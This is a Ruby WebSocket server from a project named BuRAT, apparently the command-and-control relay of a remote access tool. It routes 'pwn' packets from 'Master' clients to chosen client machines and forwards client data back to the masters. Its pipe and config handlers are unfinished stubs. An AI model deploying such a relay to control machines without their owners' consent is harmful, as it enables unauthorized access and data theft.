require 'faye/websocket'
require 'json'

module BuRAT
  class WebSocketServer
    KEEPALIVE_TIME = 15 # in seconds

    def initialize(app)
      @app     = app
      @clients = []
    end

    def call(env)
      if Faye::WebSocket.websocket?(env)
        ws = Faye::WebSocket.new(env, nil, {ping: KEEPALIVE_TIME })

        # OPEN
        ws.on :open do |event|

        end

        # MESSAGE
        ws.on :message do |event|
          begin
            packet = JSON.parse(event.data) # parse packet

            header = packet['header']       # header
            payload = packet['payload']     # payload
            trailer = packet['trailer']     # trailer

            p header
            #p trailer                       # debug

            if header == "clients" then     # clients - list of clients
              packet = packet("clients", @clients, 'deathnote')
              ws.send(packet)
            elsif header == "client" then   # client - client identification
              client = @clients.find { |client| client["id"] == payload["id"] }
              payload.store("status", "Online")
              payload.store("ws", ws)
              client == nil ? @clients << payload : client.replace(payload)
              packet = packet("client", payload, "disconnected")
              masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
              masters.each { |master| master["ws"].send(packet) }
            elsif header == "data" then     # data - send to master and pipe to self
              packet = packet("data", payload, trailer)
              masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
              masters.each { |master| master["ws"].send(packet) }
            elsif header == "pwn" then      # pwn - send to other clients
              packet = packet("pwn", payload, trailer)
              client = @clients.find { |client| client["id"] == payload["client.id"]}
              client["ws"].send(packet)
            elsif header == "pipe" then                   # pipe
              pipe(payload)                               # soon...
            elsif header == 'config' then                 # config
              config(payload)                             # soon...
            end
          rescue
            #ws.send(event.data)
            #some server stuff here if error is packet is not json
          end
        end

        # CLOSE
        ws.on :close do |event|
          client = @clients.find { |client| client["ws"] == ws }
          client["status"] = "Offline"
          client["ws"] = nil
          packet = packet('client', client, "disconnected")
          masters = @clients.select { |client| client["type"] == "Master" && client["status"] == "Online" }
          masters.each { |master| master["ws"].send(packet) }
        end

        # Return async Rack response
        ws.rack_response

      else
        @app.call(env)
      end
    end

    private
    #pipe
    def pipe(payload)
      p payload
    end

    #config
    def config(payload)
      p payload
    end

    #packet
    def packet(header, payload, trailer)
      {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
    end

  end
end
